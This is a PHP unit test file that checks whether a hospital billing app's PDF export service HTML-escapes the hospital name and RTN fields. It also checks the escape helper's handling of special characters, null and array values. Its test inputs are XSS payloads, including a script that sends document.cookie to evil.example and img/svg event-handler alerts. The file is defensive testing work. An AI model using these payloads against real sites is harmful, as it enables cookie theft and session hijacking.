<?php

namespace Tests\Unit;

use App\Actions\Reports\PdfExportService;
use Tests\TestCase;

class PdfExportEscapingTest extends TestCase
{
    private function buildDailyHtml(array $data, array $fiscal): string
    {
        $service = new PdfExportService;

        return $service->buildDailyClosureHtml($data, $fiscal);
    }

    private function buildRangeHtml(array $data, array $fiscal): string
    {
        $service = new PdfExportService;

        return $service->buildRangeClosureHtml($data, $fiscal);
    }

    public function test_daily_pdf_escapes_hospital_name_with_html_payload(): void
    {
        $payload = '<script>window.location="https://evil.example/?c="+document.cookie</script>';
        $maliciousFiscal = [
            'hospital_name' => $payload,
            'rtn' => '08011999123456',
        ];
        $data = [
            'date' => '2026-06-01',
            'total_billed' => 0.0,
            'total_collected' => 0.0,
            'invoice_count' => 0,
            'payment_count' => 0,
            'payments_by_method' => [],
            'invoices_by_status' => [],
        ];

        $html = $this->buildDailyHtml($data, $maliciousFiscal);

        $this->assertStringNotContainsString(
            '<script>window.location',
            $html,
            'Daily closure PDF must not contain an unescaped <script> tag in the hospital name.'
        );
        $this->assertStringContainsString(
            '&lt;script&gt;',
            $html,
            'Daily closure PDF must encode <script> as &lt;script&gt; in the hospital name.'
        );
    }

    public function test_daily_pdf_escapes_rtn_with_html_payload(): void
    {
        $payload = '"><img src=x onerror=alert(1)>';
        $maliciousFiscal = [
            'hospital_name' => 'Hospital San Rafael',
            'rtn' => $payload,
        ];
        $data = [
            'date' => '2026-06-01',
            'total_billed' => 0.0,
            'total_collected' => 0.0,
            'invoice_count' => 0,
            'payment_count' => 0,
            'payments_by_method' => [],
            'invoices_by_status' => [],
        ];

        $html = $this->buildDailyHtml($data, $maliciousFiscal);

        $this->assertStringNotContainsString(
            '"><img src=x onerror=alert(1)>',
            $html,
            'Daily closure PDF must not contain an unescaped RTN HTML payload.'
        );
        $this->assertStringContainsString(
            '&quot;&gt;&lt;img',
            $html,
            'Daily closure PDF must escape the RTN HTML payload as &quot;&gt;&lt;img.'
        );
    }

    public function test_range_pdf_escapes_hospital_name_with_html_payload(): void
    {
        $payload = '<svg/onload=alert(document.domain)>';
        $maliciousFiscal = [
            'hospital_name' => $payload,
            'rtn' => '08011999123456',
        ];
        $data = [
            'date_from' => '2026-06-01',
            'date_to' => '2026-06-07',
            'income' => [
                'total_billed' => 0.0,
                'total_collected' => 0.0,
                'total_pending' => 0.0,
                'total_partial' => 0.0,
                'total_voided' => 0.0,
                'invoice_count' => 0,
                'payment_count' => 0,
                'payments_by_method' => [],
            ],
            'categories' => ['categories' => []],
            'areas' => ['areas' => []],
            'services' => ['services' => []],
            'operations' => [
                'summary' => [
                    'void_count' => 0,
                    'reprint_count' => 0,
                    'cashier_count' => 0,
                ],
            ],
        ];

        $html = $this->buildRangeHtml($data, $maliciousFiscal);

        $this->assertStringNotContainsString(
            '<svg/onload=alert(document.domain)>',
            $html,
            'Range closure PDF must not contain an unescaped SVG onload payload in the hospital name.'
        );
        $this->assertStringContainsString(
            '&lt;svg/',
            $html,
            'Range closure PDF must encode <svg/ as &lt;svg/ in the hospital name.'
        );
    }

    public function test_helper_method_escapes_all_html_special_characters(): void
    {
        $service = new PdfExportService;

        $escaped = $service->e('<a href="b" data-x=\'c\'>d & e</a>');

        $this->assertStringNotContainsString('<', $escaped);
        $this->assertStringNotContainsString('>', $escaped);
        $this->assertStringNotContainsString('"', $escaped);
        $this->assertStringContainsString('&lt;', $escaped);
        $this->assertStringContainsString('&gt;', $escaped);
        $this->assertStringContainsString('&quot;', $escaped);
        $this->assertStringContainsString('&apos;', $escaped);
        $this->assertStringContainsString('&amp;', $escaped);
    }

    public function test_helper_method_handles_null(): void
    {
        $service = new PdfExportService;

        $this->assertSame('', $service->e(null));
    }

    public function test_pdf_builders_normalize_structured_payload_values(): void
    {
        $service = new PdfExportService;
        $fiscal = ['hospital_name' => ['invalid'], 'rtn' => ['invalid']];

        $dailyHtml = $service->buildDailyClosureHtml([
            'date' => ['invalid'],
            'total_billed' => ['invalid'],
            'total_collected' => ['invalid'],
            'payments_by_method' => ['cash' => ['invalid'], 0 => 'invalid-key'],
            'invoices_by_status' => ['issued' => ['count' => ['invalid'], 'total' => ['invalid']], 'invalid' => 'invalid-row'],
        ], $fiscal);

        $rangeHtml = $service->buildRangeClosureHtml([
            'date_from' => ['invalid'],
            'date_to' => ['invalid'],
            'income' => ['payments_by_method' => ['cash' => ['invalid']]],
            'categories' => ['categories' => [['category' => ['invalid']]], 'amount_basis' => ['invalid']],
            'areas' => ['areas' => ['invalid-row'], 'amount_source' => ['invalid']],
            'services' => ['services' => [['service' => ['invalid']]]],
            'operations' => [
                'summary' => ['void_count' => ['invalid']],
                'voids' => [['invoice_number' => ['invalid']]],
                'payment_voids' => [['method' => ['invalid'], 'amount' => ['invalid']]],
            ],
            'cash_session_report' => [
                'cash_session' => ['opened_at' => ['invalid']],
                'totals_by_method' => ['cash' => ['invalid']],
            ],
            'filters' => ['cash_session_id' => ['invalid'], 'method' => ['invalid']],
        ], $fiscal);

        $this->assertStringContainsString('Hospital General San Isidro', $dailyHtml);
        $this->assertStringContainsString('RTN: N/A', $dailyHtml);
        $this->assertStringNotContainsString('Array', $dailyHtml);
        $this->assertStringContainsString('Hospital General San Isidro', $rangeHtml);
        $this->assertStringContainsString('RTN: N/A', $rangeHtml);
        $this->assertStringNotContainsString('Array', $rangeHtml);
    }
}
